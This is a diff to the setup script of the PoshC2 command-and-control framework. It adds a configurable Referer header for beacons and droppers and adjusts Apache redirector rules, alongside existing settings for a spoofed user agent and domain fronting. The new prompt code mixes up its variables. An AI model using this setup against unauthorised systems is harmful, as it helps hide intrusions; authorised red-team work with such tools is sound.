@@ -17,7 +17,7 @@ Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -Fore
 Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
 Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
 Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
-Write-Host "=============== v3.3 www.PoshC2.co.uk =============" -ForegroundColor Green
+Write-Host "=============== v3.4 www.PoshC2.co.uk =============" -ForegroundColor Green
 Write-Host "" -ForegroundColor Green
 
 if (!$RestartC2Server) {
@@ -311,6 +311,7 @@ if ($RestartC2Server)
     $Socksurlstring = $c2serverresults.SocksURLS
     $Insecure = $c2serverresults.Insecure
     $useragent = $c2serverresults.UserAgent
+    $Referer = $c2serverresults.Referer
 
     $downloadStub = $urlstring -split ","
     $downloadStubURL = $downloadStub[1] -replace '"',''
@@ -508,8 +509,6 @@ SSLProxyCheckPeerExpire off
 Define PoshC2 <ADD_IPADDRESS_HERE>
 Define SharpSocks <ADD_IPADDRESS_HERE>
 
-RewriteRule ^/webapp/static(.*) $uri`${PoshC2}/webapp/static`$1 [NC,L,P]
-RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,L,P]
 "@
     $customurldef = "No"
     $customurl = Read-Host -Prompt "[3a] Do you want to customize the beacon URLs from the default? [No]"
@@ -536,8 +535,6 @@ SSLProxyCheckPeerExpire off
 Define PoshC2 <ADD_IPADDRESS_HERE>
 Define SharpSocks <ADD_IPADDRESS_HERE>
 
-RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,L,P]
-RewriteRule ^/images/static/content/(.*) $uri`${PoshC2}/images/static/content/`$1 [NC,L,P]
 RewriteRule ^/news/(.*) $uri`${PoshC2}/news/`$1 [NC,L,P]
 RewriteRule ^/webapp/static/(.*) $uri`${PoshC2}/webapp/static/`$1 [NC,L,P]
 RewriteRule ^/images/prints/(.*) $uri`${PoshC2}/images/prints/`$1 [NC,L,P]
@@ -590,13 +587,23 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
     }
 
     $customuseragentdef = "No"
-    $customuseragent = Read-Host -Prompt "[4] Do you want to customize the default UserAgent? [No]"
+    $customuseragent = Read-Host -Prompt "[4a] Do you want to customize the default UserAgent? [No]"
     $customuseragent = ($customuseragentdef,$customuseragent)[[bool]$customuseragent]
 
     if ($customuseragent -eq "Yes") {
         $useragent = (Read-Host "Please enter the UserAgent you want to use: ")
     } else {
         $useragent = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"
+    }
+
+    $customreferer = "No"
+    $customuseragent = Read-Host -Prompt "[4b] Do you want to a referer header? [No]"
+    $customuseragent = ($customuseragentdef,$customuseragent)[[bool]$customuseragent]
+
+    if ($customuseragent -eq "Yes") {
+        $referer = (Read-Host "Please enter the Referer you want to use: ")
+    } else {
+        $referer = ""
     }
 
     $global:newdir = 'PoshC2-'+(get-date -Format yyy-dd-MM-HHmm)
@@ -754,7 +761,8 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
         URLS TEXT,
         SocksURLS TEXT,
         Insecure TEXT,
-        UserAgent TEXT)'
+        UserAgent TEXT,
+        Referer TEXT)'
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
@@ -764,8 +772,8 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
-    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, EncKey, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS, SocksURLS, Insecure, UserAgent)
-            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @EncKey, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS, @SocksURLS, @Insecure, @UserAgent)'
+    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, EncKey, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS, SocksURLS, Insecure, UserAgent, Referer)
+            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @EncKey, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS, @SocksURLS, @Insecure, @UserAgent, @Referer)'
 
     Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
         DefaultSleep = $defaultbeacon
@@ -785,6 +793,7 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
         SocksURLS = $socksurlstring
         Insecure = $Insecure
         UserAgent = $useragent
+        Referer = $Referer
     } | Out-Null
 
     $Host.ui.RawUI.WindowTitle = "PoshC2 Server: $ipv4address Port $serverport"
@@ -826,9 +835,9 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
     
     Import-Module $PoshPath\C2-Payloads.ps1 
     if ($Insecure -eq "YES") {
-        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent -Insecure
+        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent -Insecure -Referer $Referer
     } else {
-        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent
+        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent -Referer $Referer
     }
     $payload = createrawpayload -command $command
 
